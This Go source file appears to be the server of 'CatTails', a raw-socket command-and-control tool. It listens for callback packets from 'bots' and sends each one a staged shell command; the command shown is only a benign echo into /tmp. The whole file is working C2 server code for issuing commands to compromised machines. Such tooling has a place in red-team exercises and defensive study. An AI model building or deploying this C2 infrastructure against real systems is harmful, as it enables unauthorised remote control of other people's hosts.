package main

import (
	"fmt"
	"log"
	"net"
	"strings"

	"github.com/google/gopacket"
	"github.com/oneNutW0nder/CatTails/cattails"
	"golang.org/x/sys/unix"
)

var stagedCmd = "echo hi > /tmp/cattails"

// Host defines values for a callback from a bot
type Host struct {
	Hostname string
	Mac      net.HardwareAddr
	IP       net.IP
}

// sendCommand takes
func sendCommand(iface *net.Interface, src net.IP, dstMAC net.HardwareAddr, listen chan Host) {

	// Forever loop to respond to bots
	for {
		bot := <-listen
		fd := cattails.NewSocket()
		// Create packet
		packet := cattails.CreatePacket(iface, src, bot.IP, dstMAC, cattails.CreateCommand(stagedCmd))
		fmt.Println("[+] Repsonding to:", bot)

		cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)

		fmt.Println("Sent reponse to:", bot.Hostname)
		unix.Close(fd)
	}
}

// ProcessPacket TODO:
func serverProcessPacket(packet gopacket.Packet, listen chan Host) {

	data := string(packet.ApplicationLayer().Payload())

	payload := strings.Split(data, " ")

	mac, err := net.ParseMAC(payload[2])
	if err != nil {
		log.Fatal(err)
	}

	// New Host struct for shipping info to sendCommand()
	newHost := Host{
		Hostname: payload[1],
		Mac:      mac,
		IP:       net.ParseIP(payload[3]),
	}

	// Write host to channel
	listen <- newHost
}

func main() {

	vm := cattails.CreateBPFVM(cattails.FilterRaw)

	readfd := cattails.NewSocket()
	defer unix.Close(readfd)

	fmt.Println("[+] Created sockets")

	// Make channel
	listen := make(chan Host)

	// Iface and src ip for the sendcommand func to use
	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
	fmt.Println("[+] Interface:", iface.Name)

	dstMAC, err := cattails.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] DST MAC:", dstMAC.String())

	// Spawn routine to listen for responses
	fmt.Println("[+] Starting go routine...")
	go sendCommand(iface, src, dstMAC, listen)

	for {
		// packet := cattails.ServerReadPacket(readfd, vm)
		packet := cattails.ServerReadPacket(readfd, vm)
		// Yeet over to processing function
		if packet != nil {
			go serverProcessPacket(packet, listen)
		}
	}
}
